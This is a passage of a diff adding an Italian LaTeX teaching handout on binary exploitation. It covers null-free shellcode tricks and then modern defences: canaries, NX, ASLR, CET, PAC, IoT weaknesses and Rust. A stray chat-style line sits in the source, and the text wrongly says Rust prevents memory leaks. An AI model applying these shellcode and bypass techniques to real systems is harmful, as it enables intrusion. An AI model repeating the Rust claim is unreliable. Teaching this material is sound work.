+  3F, un\textquotesingle istruzione pulita, di soli 2 byte, e senza
+  alcun Null Byte.
+\item
+  \textbf{L\textquotesingle uso dello XOR per azzerare i registri:}
+  Invece di usare mov ecx, 0 (che genererebbe B9 00 00 00 00), abbiamo
+  utilizzato l\textquotesingle operazione bit a bit \textbf{OR
+  Esclusivo}: xor ecx, ecx. Qualsiasi valore elaborato in XOR con se
+  stesso restituisce sempre \textbf{zero} (es. 1 XOR 1 = 0). Questa
+  operazione è nativa nella CPU, è leggermente più veloce della
+  direttiva mov, e soprattutto viene compilata nei byte 31 C9, azzerando
+  il registro a 32-bit senza inserire un solo Null Byte nel nostro
+  payload.
+\end{enumerate}
+
+Ecco l\textquotesingle ultimo capitolo della dispensa. Questo modulo è
+fondamentale per chiudere il cerchio: dopo aver insegnato agli studenti
+come distruggere un sistema, dobbiamo spiegare loro come
+l\textquotesingle industria informatica si difende oggi e perché
+studiamo queste tecniche se esistono le protezioni.
+
+\section{7. Il Contrattacco della Difesa: Mitigazioni e Sicurezza
+Moderna}\label{il-contrattacco-della-difesa-mitigazioni-e-sicurezza-moderna}
+
+Nei laboratori precedenti abbiamo avuto gioco facile perché abbiamo
+deliberatamente disabilitato le difese del sistema operativo e del
+compilatore (tramite flag come -fno-stack-protector o disattivando
+l\textquotesingle ASLR). Nel mondo reale, l\textquotesingle industria
+informatica non è rimasta a guardare mentre i Buffer Overflow decimavano
+la sicurezza dei server globali.
+
+Nel corso degli anni, sono state implementate diverse difese
+strutturali. Analizziamo le principali contromisure che incontreremo (e
+che i penetration tester moderni devono imparare a eludere).
+
+\subsection{7.1 Le Contromisure
+Classiche}\label{le-contromisure-classiche}
+
+\subsubsection{1. Stack Canaries (I
+Canarini)}\label{stack-canaries-i-canarini}
+
+Prende il nome dall\textquotesingle antica pratica dei minatori di
+portare un canarino in miniera: se l\textquotesingle aria diventava
+tossica, il canarino moriva prima dei minatori, dando
+l\textquotesingle allarme. In informatica, lo \textbf{Stack Canary} è un
+valore casuale (segreto e generato a ogni avvio) che il compilatore
+inserisce nello Stack, posizionandolo esattamente tra le variabili
+locali (il nostro buffer) e l\textquotesingle indirizzo di ritorno
+(EIP/RIP).
+
+Quando la funzione termina, prima di eseguire
+l\textquotesingle istruzione ret, il programma verifica se il canarino è
+ancora intatto. Se un Buffer Overflow ha allagato lo Stack per
+sovrascrivere l\textquotesingle EIP, avrà inevitabilmente sovrascritto e
+alterato anche il canarino. Il sistema rileva la discrepanza e abortisce
+immediatamente il programma con l\textquotesingle errore stack smashing
+detected, prevenendo l\textquotesingle esecuzione di codice arbitrario.
+
+\subsubsection{2. Stack Non Eseguibile (NX Bit /
+DEP)}\label{stack-non-eseguibile-nx-bit-dep}
+
+Questa è la mitigazione che ha bloccato i nostri primi tentativi di
+shell. La logica alla base è semplice: \textbf{i dati non devono mai
+essere eseguiti come codice}. Sfruttando un flag a livello hardware
+della CPU (chiamato No-eXecute bit da AMD, o Data Execution Prevention
+da Windows), il sistema operativo marca specifiche aree di memoria (come
+lo Stack e l\textquotesingle Heap) con permessi di sola Lettura e
+Scrittura (RW), rimuovendo il permesso di Esecuzione (X). Anche se un
+attaccante riesce a sovrascrivere l\textquotesingle EIP e a farlo
+saltare al proprio shellcode, la CPU si rifiuterà di eseguire le
+istruzioni, sollevando un SIGSEGV. \emph{(Nota: Per aggirare questa
+difesa, gli hacker moderni usano una tecnica avanzata chiamata ROP -
+Return Oriented Programming, che riutilizza frammenti di codice
+legittimo già presente in memoria).}
+
+\subsubsection{3. Randomizzazione della Memoria (ASLR e
+PIE)}\label{randomizzazione-della-memoria-aslr-e-pie}
+
+La \textbf{Address Space Layout Randomization (ASLR)} distrugge
+l\textquotesingle affidabilità degli exploit basati su indirizzi
+statici. Ad ogni esecuzione del programma, il sistema operativo carica
+lo Stack, l\textquotesingle Heap e le librerie di sistema (come la libc)
+in indirizzi di memoria virtuale completamente casuali. A questo si
+aggiunge il \textbf{PIE (Position Independent Executable)}, che
+randomizza anche la posizione del codice sorgente stesso (il segmento
+Text). Il nostro script Python precedente, che saltava
+all\textquotesingle indirizzo 0xffc98cf0, fallirebbe il 99.9\% delle
+volte su un sistema con ASLR attivo. Per eluderlo, un attaccante ha
+bisogno di una vulnerabilità aggiuntiva capace di far "trapelare"
+informazioni (Memory Leak) per calcolare i nuovi indirizzi al volo.
+
+\subsection{7.2 L\textquotesingle Evoluzione: Supporto Architetturale
+Hardware}\label{levoluzione-supporto-architetturale-hardware}
+
+Le difese basate sul software (come i canarini) possono essere
+raggirate. Per questo motivo, i produttori di CPU hanno recentemente
+integrato difese direttamente nell\textquotesingle hardware (nel
+silicio).
+
+\begin{itemize}
+\item
+  \textbf{Shadow Stack (Intel CET):} La tecnologia Control-flow
+  Enforcement Technology di Intel ha introdotto uno "Stack Ombra". È uno
+  Stack secondario, gestito esclusivamente
+  dall\textquotesingle hardware, in cui vengono salvati \emph{solo} gli
+  indirizzi di ritorno. Quando una funzione termina, la CPU confronta
+  l\textquotesingle indirizzo di ritorno sullo Stack tradizionale (che
+  l\textquotesingle utente può corrompere) con quello sullo Shadow Stack
+  (che è inaccessibile all\textquotesingle utente). Se non combaciano,
+  il processo viene terminato.
+\item
+  \textbf{Pointer Authentication (ARM PAC):} Sui processori ARM moderni
+  (come i chip Apple Silicon), gli indirizzi di memoria vengono firmati
+  crittograficamente prima di essere salvati nello stack. Se
+  l\textquotesingle attaccante sovrascrive un indirizzo, la firma
+  digitale si corrompe e il salto fallisce.
+\end{itemize}
+
+\subsection{7.3 Il Tallone d\textquotesingle Achille:
+L\textquotesingle Ecosistema Embedded e
+IoT}\label{il-tallone-dachille-lecosistema-embedded-e-iot}
+
+A questo punto è lecito chiedersi: \emph{se esistono tutte queste difese
+invincibili, la binary exploitation è morta?}
+
+La risposta è \textbf{assolutamente no}. Gran parte
+dell\textquotesingle infrastruttura mondiale non gira su server di
+ultima generazione. Dobbiamo considerare l\textquotesingle immenso
+panorama dei \textbf{sistemi embedded} (dispositivi IoT, router
+domestici, telecamere IP, centraline automobilistiche e sistemi di
+controllo industriale - SCADA).
+
+In questi contesti, l\textquotesingle applicabilità delle contromisure
+moderne è drasticamente ridotta:
+
+\begin{enumerate}
+\def\labelenumi{\arabic{enumi}.}
+\item
+  \textbf{Limiti Hardware:} Molti microcontrollori economici (usati
+  nell\textquotesingle IoT) non possiedono una MMU (Memory Management
+  Unit) sofisticata. Senza MMU, è fisicamente impossibile implementare
+  la protezione NX (Non Eseguibile) o separare correttamente la memoria.
+\item
+  \textbf{Limiti di Risorse:} I Canarini e l\textquotesingle ASLR
+  richiedono calcoli aggiuntivi della CPU e maggiore consumo di RAM. Su
+  dispositivi con potenze di calcolo limitate o alimentati a batteria,
+  gli sviluppatori spesso disabilitano volontariamente queste protezioni
+  in fase di compilazione per guadagnare prestazioni.
+\item
+  \textbf{Legacy Code:} Molti apparati industriali o ospedalieri
+  eseguono firmware compilato 15 o 20 anni fa, molto prima che queste
+  protezioni diventassero lo standard, e non possono essere aggiornati
+  facilmente.
+\end{enumerate}
+
+Per questo motivo, l\textquotesingle ecosistema IoT oggi è il più vasto
+e proficuo terreno di caccia per la binary exploitation.
+
+\subsection{7.4 Il C è il problema? L\textquotesingle avvento dei
+linguaggi "Memory
+Safe"}\label{il-c-uxe8-il-problema-lavvento-dei-linguaggi-memory-safe}
+
+Tutte le vulnerabilità che abbiamo esplorato in questo corso (Buffer
+Overflow, Use-After-Free, ecc.) derivano da un difetto architetturale
+comune: abbiamo costruito l\textquotesingle infrastruttura digitale
+mondiale su linguaggi, come il \textbf{C e il C++}, che non offrono la
+\textbf{Memory Safety}.
+
+Il C è stato progettato negli anni \textquotesingle70 per essere veloce
+come l\textquotesingle assembly e per fidarsi ciecamente del
+programmatore. Non controlla se stiamo scrivendo 100 byte in uno spazio
+da 50; semplicemente esegue l\textquotesingle ordine, distruggendo la
+memoria circostante.
+
+Oggi, l\textquotesingle industria informatica sta affrontando un cambio
+di paradigma epocale. Linguaggi come Java o Python risolvono il problema
+della memoria usando un \emph{Garbage Collector}, ma sono troppo lenti o
+pesanti per scrivere sistemi operativi o software a basso livello.
+
+La vera rivoluzione attuale porta il nome di \textbf{Rust}. Rust è un
+linguaggio di programmazione di sistema che offre le stesse prestazioni
+estreme del C/C++, ma \textbf{garantisce matematicamente la sicurezza
+della memoria in fase di compilazione}. Grazie a concetti rivoluzionari
+come l\textquotesingle{}\emph{Ownership} e il \emph{Borrow Checker}, il
+compilatore di Rust si rifiuta categoricamente di compilare codice che
+potrebbe generare un Buffer Overflow, un memory leak o condizioni di
+gara (data race), senza alcun impatto sulle prestazioni a runtime.
+
+L\textquotesingle impatto di questa transizione è così devastante che
+persino colossi storicamente conservatori hanno ceduto: di recente,
+pezzi del Kernel Linux e del kernel di Microsoft Windows sono stati
+riscritti in Rust, e le agenzie di sicurezza governative (come la CISA
+negli USA) consigliano ufficialmente di abbandonare gradualmente il
+C/C++ in favore di linguaggi \emph{memory-safe}.
+
+Comprendere come sfruttare il codice C insicuro è il primo, fondamentale
+passo per capire perché il futuro dell\textquotesingle informatica sta
+convergendo verso architetture sicure by-design.
+
+\end{document}
